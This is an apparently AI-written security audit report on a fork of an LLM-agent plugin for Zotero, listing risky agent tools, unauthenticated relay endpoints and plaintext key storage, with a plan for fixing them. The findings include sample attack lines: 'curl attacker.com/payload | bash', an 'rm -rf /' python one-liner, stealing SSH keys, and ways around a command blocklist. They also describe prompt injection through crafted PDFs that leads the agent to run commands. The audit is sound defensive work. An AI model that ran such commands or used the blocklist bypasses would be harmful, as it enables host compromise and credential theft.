# MIMO AUDIT REPORT — llm-for-zotero

**Repository:** [uscabayaosj/llm-for-zotero_hack](https://github.com/uscabayaosj/llm-for-zotero_hack)
**Fork of:** [yilewang/llm-for-zotero](https://github.com/yilewang/llm-for-zotero) (v3.8.25)
**Audit Date:** 2026-07-07
**Auditor:** MiMo v2.5 Pro (Hermes Agent)
**License:** AGPL-3.0-or-later

---

## 1. Executive Summary

**llm-for-zotero** is a mature, feature-rich Zotero 7/8/9 plugin that embeds an LLM-powered research agent directly inside the Zotero PDF reader. It supports eight+ LLM providers (OpenAI, Anthropic, Gemini, DeepSeek, Qwen, Grok, Kimi, MiMo), a WebChat relay for ChatGPT/DeepSeek browser sync, a Codex App Server integration, a Claude Code bridge, an MCP server for tool-calling agents, and a full agent mode with 15+ tools including arbitrary shell execution, JavaScript execution in Zotero's privileged runtime, and filesystem read/write.

### Overall Risk Posture: **HIGH**

The plugin's agent architecture grants an LLM **unrestricted shell access**, **arbitrary JavaScript execution in a privileged Gecko runtime**, and **full filesystem read/write**. While confirmation gates exist for some write operations, critical tools (`run_command`, `zotero_script` read mode) can execute without user approval. The WebChat relay endpoints on Zotero's HTTP server have **zero authentication**, exposing them to any local process. API keys and OAuth tokens are stored in plaintext.

The codebase is well-engineered TypeScript with strong typing, comprehensive test coverage (150+ test files), and thoughtful undo/snapshot mechanisms. However, the attack surface is inherently large due to the plugin's design philosophy of giving the LLM maximum capability.

---

## 2. Critical Security Findings

### C-01: Arbitrary Shell Command Execution Without Confirmation Gate
- **File:** `src/agent/tools/write/runCommand.ts` (lines 60–239, 241–501)
- **Severity:** CRITICAL
- **Description:** The `run_command` tool executes arbitrary shell commands via Mozilla's `Subprocess` module. The tool's `AgentToolDefinition` does **not** set `requiresConfirmation: true` at the spec level — there is no `shouldRequireConfirmation()` override visible in the first 500 lines. The regex-based destructiveness filter (`DESTRUCTIVE_COMMANDS`, line 242) can be bypassed with:
  - Shell encoding (`base64`, `xxd`, `printf \\x`)
  - Alias/function redefinition before the dangerous command
  - Python/Ruby/Node one-liners (`python3 -c "import os; os.system('rm -rf /')"`)
  - Command chaining with whitespace tricks the regex doesn't cover
- **Impact:** Full remote code execution on the host. An LLM prompt injection (via a crafted PDF or paper title) could execute `curl attacker.com/payload | bash` or exfiltrate `~/.ssh/id_rsa`.
- **Remediation:** Add `requiresConfirmation: true` to the `run_command` tool spec. Implement an allowlist approach (pre-approved commands) rather than a blocklist regex. Add a `shouldRequireConfirmation()` method that always returns `true`.

### C-02: Arbitrary JavaScript Execution in Privileged Gecko Runtime
- **File:** `src/agent/tools/write/zoteroScript.ts` (lines 194–266, 361–524)
- **Severity:** CRITICAL
- **Description:** The `zotero_script` tool uses `new AsyncFunction("Zotero", "env", params.script)` (line 228) to execute arbitrary JavaScript in Zotero's privileged chrome context. Read mode (`mode: "read"`) has `shouldRequireConfirmation() => false` (line 488–489), meaning it runs **without user approval**. The guidance comment explicitly says "runs directly without a review card" (line 812 of `server.ts`).
- **Impact:** Read-mode scripts have full access to `Zotero.*` APIs, `IOUtils`, `OS.File`, `Components.classes`, and the entire Gecko runtime. A crafted script could: read all Zotero data, exfiltrate API keys from preferences, install persistent backdoors via Zotero plugin overrides, or access the filesystem.
- **Remediation:** Require confirmation for all `zotero_script` executions regardless of mode. Implement a sandboxed execution environment with a restricted API surface. At minimum, disable `Components.classes` access in read mode.

### C-03: Unauthenticated WebChat Relay Endpoints
- **File:** `src/webchat/relayServer.ts` (lines 840–1200+)
- **Severity:** CRITICAL
- **Description:** All WebChat relay endpoints are registered on Zotero's built-in HTTP server (port 23119) with **zero authentication**. Any local process (browser extension, malware, or another app) can:
  - `POST /submit_query` — inject arbitrary prompts into the LLM pipeline
  - `POST /submit_response` — inject arbitrary responses as if from ChatGPT
  - `POST /update_partial` — manipulate streaming state
  - `POST /load_chat` — redirect to attacker-controlled URLs
  - `POST /new_chat` — issue navigation commands to the browser extension
- **Impact:** Local privilege escalation. Any process on the machine can hijack the LLM conversation, inject prompt injection payloads, or redirect the user to phishing sites.
- **Remediation:** Add bearer token authentication to all relay endpoints (similar to the MCP server's approach). Generate a per-session random token and require it in the `Authorization` header.

### C-04: Arbitrary Filesystem Read/Write via Agent
- **File:** `src/agent/tools/write/fileIO.ts` (lines 391–442, 444–501)
- **Severity:** CRITICAL
- **Description:** The `file_io` tool provides unrestricted filesystem read and write. Read operations have no confirmation gate. Write operations have `requiresConfirmation: true`, but the path validation is minimal — no sandboxing to a specific directory, no allowlist of permitted paths.
- **Impact:** An LLM prompt injection could read `/etc/passwd`, `~/.ssh/authorized_keys`, browser credential stores, or write malicious scripts to startup directories.
- **Remediation:** Implement path allowlisting (restrict to Zotero data directory and user-configured notes directory). Add confirmation for read operations on paths outside the Zotero data directory.

---

## 3. High Security Findings

### H-01: API Keys Stored in Plaintext in Zotero Preferences
- **File:** `src/utils/llmClient.ts` (lines 228–265)
- **Severity:** HIGH
- **Description:** API keys for all providers are stored via `Zotero.Prefs.get(prefKey("apiKey"))` and persisted in Zotero's `prefs.js` file (plain text) and SQLite database. No encryption, no OS keychain integration.
- **Remediation:** Integrate with OS keychain (macOS Keychain, Windows Credential Manager, GNOME Keyring). At minimum, warn users that keys are stored in plaintext.

### H-02: Codex Auth Tokens Stored in Plaintext File
- **File:** `src/utils/llmClient.ts` (lines 572–718)
- **Severity:** HIGH
- **Description:** Codex OAuth tokens are stored at `~/.codex/auth.json` in plaintext. The `refreshCodexAccessToken` function reads and writes this file without file permission restrictions. Any local process can read these tokens.
- **Remediation:** Set file permissions to `0600` after writing. Consider storing tokens in the OS keychain.

### H-03: MCP Server Token Generation Uses Math.random() Fallback
- **File:** `src/agent/mcp/server.ts` (lines 264–277)
- **Severity:** HIGH
- **Description:** The `generateToken()` function falls back to `Math.random()` if `crypto.getRandomValues` is unavailable (line 270–272). While `crypto.getRandomValues` is universally available in modern Gecko, the fallback exists and `Math.random()` is not cryptographically secure.
- **Remediation:** Remove the `Math.random()` fallback. Throw an error if `crypto.getRandomValues` is unavailable.

### H-04: SQL Query Construction via String Interpolation
- **File:** `src/shared/conversationMessageSql.ts` (lines 21–35)
- **Severity:** HIGH
- **Description:** The `buildLatestStoredMessagesQuery` function constructs SQL via string interpolation of `tableName`, `selectColumnsSql`, and `whereSql` parameters. While these values likely come from internal code rather than user input, the pattern is dangerous — any future change that passes unsanitized values could introduce SQL injection.
- **Remediation:** Use parameterized queries for all dynamic values. At minimum, validate that `tableName` matches a known table name pattern.

### H-05: SSRF via User-Configurable API Base URL
- **File:** `src/utils/llmClient.ts` (lines 230–304), `src/utils/providerTransport.ts` (lines 227–266)
- **Severity:** HIGH
- **Description:** The `apiBase` URL is user-configurable and passed directly to `fetch()`. An attacker who can modify Zotero preferences (via `zotero_script` or a malicious plugin) could redirect LLM API calls to internal services (e.g., `http://127.0.0.1:6379` for Redis, `http://metadata.google.internal` for cloud metadata).
- **Remediation:** Validate that `apiBase` URLs point to known LLM provider domains or at minimum block private IP ranges (127.0.0.0/8, 10.0.0.0/8, 169.254.0.0/16, 192.168.0.0/16).

---

## 4. Medium Security Findings

### M-01: WebChat Relay Exposed on Zotero HTTP Port
- **File:** `src/webchat/relayServer.ts` (line 34)
- **Severity:** MEDIUM
- **Description:** The relay uses `Zotero.Prefs.get("httpServer.port")` which defaults to 23119. If the user has configured Zotero's HTTP server to listen on all interfaces (not just localhost), the relay endpoints are network-accessible.
- **Remediation:** Verify that Zotero's HTTP server binds to `127.0.0.1` only. Add a check and warning if it's bound to `0.0.0.0`.

### M-02: Copilot Header Spoofing
- **File:** `src/utils/providerTransport.ts` (lines 278–287)
- **Severity:** MEDIUM
- **Description:** The plugin spoofs VS Code Copilot headers (`Editor-Version: "vscode/1.96.0"`, `Editor-Plugin-Version: "copilot-chat/0.24.2"`, `User-Agent: "GithubCopilot/1.246.0"`) to access GitHub Copilot's API. This violates GitHub's Terms of Service and could result in account suspension.
- **Remediation:** Document this risk prominently. Consider using GitHub's official Copilot API if/when available.

### M-03: Input Token Cap Applied Post-Construction
- **File:** `src/utils/llmClient.ts` (lines 1391–1426)
- **Severity:** MEDIUM
- **Description:** Messages are fully constructed (including context, history, images) before `applyModelInputTokenCap` is applied. For very large contexts, this means the full payload is in memory before truncation.
- **Remediation:** Apply token budgeting during message construction, not after.

### M-04: No Rate Limiting on WebChat Relay Endpoints
- **File:** `src/webchat/relayServer.ts`
- **Severity:** MEDIUM
- **Description:** No rate limiting on any relay endpoint. A local process could flood `submit_query` or `update_partial` to cause denial of service.
- **Remediation:** Add basic rate limiting (e.g., max 10 requests/second per endpoint).

---

## 5. Architecture Assessment

### Strengths
1. **Type Safety:** Comprehensive TypeScript with strict types throughout. All tool inputs have explicit type definitions and validation.
2. **Tool Registry Pattern:** Clean `AgentToolDefinition` interface with `spec`, `guidance`, `presentation`, `validate`, and `execute` phases. Well-designed confirmation flow.
3. **Undo System:** `undoStore` with item snapshots and custom undo steps. The `zotero_script` tool requires `env.snapshot(item)` before mutations.
4. **Multi-Provider Architecture:** Clean provider abstraction via `ProviderProtocol` enum and `buildProviderTransportHeaders()`. Supports 8+ LLM providers with protocol-specific payload construction.
5. **Test Coverage:** 150+ test files covering unit, integration, and workflow scenarios.
6. **Context Management:** Sophisticated context budgeting, token estimation, and transcript compaction for long research sessions.
7. **MCP Server:** Well-designed MCP protocol implementation with scope isolation, read deduplication, and confirmation handlers.

### Weaknesses
1. **Monolithic Files:** `llmClient.ts` (4,226 lines, 125KB) and `relayServer.ts` (1,882 lines, 57KB) are too large. The LLM client mixes auth, payload construction, streaming parsing, file upload, and provider-specific logic in a single file.
2. **No Dependency Pinning in CI:** The CI workflow uses `zotero-plugin-dev/workflows/setup-js@main` (pinned to `main` branch, not a SHA or tag). A compromised upstream action could inject malicious code.
3. **Inconsistent Confirmation Gates:** Some write tools require confirmation, others don't. `run_command` (shell access) has no visible confirmation gate, while `file_io` (filesystem) does. This inconsistency creates security gaps.
4. **No CSP Headers:** XHTML pages (`standaloneChat.xhtml`, `preferences.xhtml`) don't define Content Security Policy headers, increasing XSS risk if user-controlled content is rendered.
5. **`any` Type Proliferation:** Extensive use of `(globalThis as any)` and `(Zotero as any)` casts throughout the codebase, bypassing TypeScript's type safety for Gecko API access.

---

## 6. Code Quality Findings

### Q-01: Deep Nesting and Complex Control Flow
- `llmClient.ts` has deeply nested callback chains (5+ levels) in streaming parsers. The `parseResponsesStream` function spans 400+ lines.
- **Recommendation:** Extract streaming parsers into separate modules.

### Q-02: Duplicated Normalization Patterns
- Multiple files duplicate the same normalization patterns (string trimming, positive int parsing, path normalization). These should be consolidated into shared utilities.
- `normalizeText`, `normalizePositiveInt`, `normalizeRecord` are defined separately in `mcp/server.ts` and `agent/tools/shared.ts`.

### Q-03: Error Swallowing
- Numerous `catch { /* ignore */ }` blocks throughout the codebase (especially in `zoteroScript.ts` undo logic and `fileIO.ts`). While some are justified, silent failures make debugging difficult.
- **Recommendation:** Log caught errors at debug level even if they're not propagated.

### Q-04: Missing JSDoc on Public APIs
- Many exported functions lack JSDoc comments. The `callLLM`, `callLLMStream`, `prepareChatRequest` functions have minimal documentation despite being the primary API surface.

---

## 7. Remediation Roadmap

### Priority 1 — Immediate (Week 1)
| # | Finding | Action | Effort |
|---|---------|--------|--------|
| 1 | C-01 | Add `requiresConfirmation: true` to `run_command` tool spec | 1h |
| 2 | C-02 | Add confirmation gate to `zotero_script` read mode | 2h |
| 3 | C-03 | Add bearer token auth to WebChat relay endpoints | 4h |
| 4 | H-03 | Remove `Math.random()` fallback in token generation | 30m |

### Priority 2 — Short-Term (Weeks 2–4)
| # | Finding | Action | Effort |
|---|---------|--------|--------|
| 5 | C-04 | Implement path allowlisting for `file_io` | 4h |
| 6 | H-01 | Integrate OS keychain for API key storage | 2d |
| 7 | H-02 | Set `0600` permissions on `~/.codex/auth.json` | 1h |
| 8 | H-04 | Audit and parameterize all SQL query construction | 4h |
| 9 | H-05 | Add private IP range blocking for `apiBase` URLs | 2h |
| 10 | M-02 | Document Copilot ToS risk prominently | 1h |

### Priority 3 — Medium-Term (Months 2–3)
| # | Finding | Action | Effort |
|---|---------|--------|--------|
| 11 | M-01 | Verify HTTP server bind address; add warning | 2h |
| 12 | M-03 | Refactor token budgeting to apply during construction | 1d |
| 13 | M-04 | Add rate limiting to relay endpoints | 4h |
| 14 | Arch | Split `llmClient.ts` into auth, transport, and parser modules | 3d |
| 15 | Arch | Pin CI workflow actions to SHA | 1h |
| 16 | Q-01 | Extract streaming parsers into separate modules | 2d |

### Priority 4 — Long-Term (Quarter 2)
| # | Finding | Action | Effort |
|---|---------|--------|--------|
| 17 | Arch | Add CSP headers to all XHTML pages | 2h |
| 18 | Q-02 | Consolidate duplicated normalization utilities | 1d |
| 19 | Q-03 | Add debug-level logging to all catch blocks | 1d |
| 20 | C-01 | Implement command allowlist approach for `run_command` | 1w |
| 21 | C-02 | Implement sandboxed execution for `zotero_script` | 2w |

---

## 8. Files Audited

| File | Lines | Purpose |
|------|-------|---------|
| `src/utils/llmClient.ts` | 4,226 | Core LLM API client, auth, streaming |
| `src/utils/apiHelpers.ts` | 167 | Endpoint resolution, header construction |
| `src/utils/providerTransport.ts` | 301 | Provider-specific URL/header resolution |
| `src/agent/tools/write/runCommand.ts` | 743 | Shell command execution tool |
| `src/agent/tools/write/fileIO.ts` | 854 | Filesystem read/write tool |
| `src/agent/tools/write/zoteroScript.ts` | 524 | JavaScript execution in Gecko runtime |
| `src/agent/tools/write/importIdentifiers.ts` | 158 | DOI/ISBN/arXiv import tool |
| `src/agent/tools/write/importLocalFiles.ts` | 163 | Local file import tool |
| `src/agent/mcp/server.ts` | 1,515 | MCP JSON-RPC server |
| `src/agent/externalBackendBridge.ts` | 2,778 | Claude Code/Codex bridge |
| `src/webchat/relayServer.ts` | 1,882 | ChatGPT/DeepSeek web relay |
| `src/shared/conversationMessageSql.ts` | 35 | SQL query construction |
| `src/shared/conversationStorageRouting.ts` | 16 | Conversation routing |
| `package.json` | 74 | Dependencies and scripts |
| `.env.example` | 29 | Environment template |
| `.github/workflows/ci.yml` | 44 | CI pipeline |
| `.github/workflows/release.yml` | 36 | Release pipeline |
| `addon/manifest.json` | — | Zotero addon manifest |
| `README.md` | 763 | Documentation |

---

*End of Audit Report*
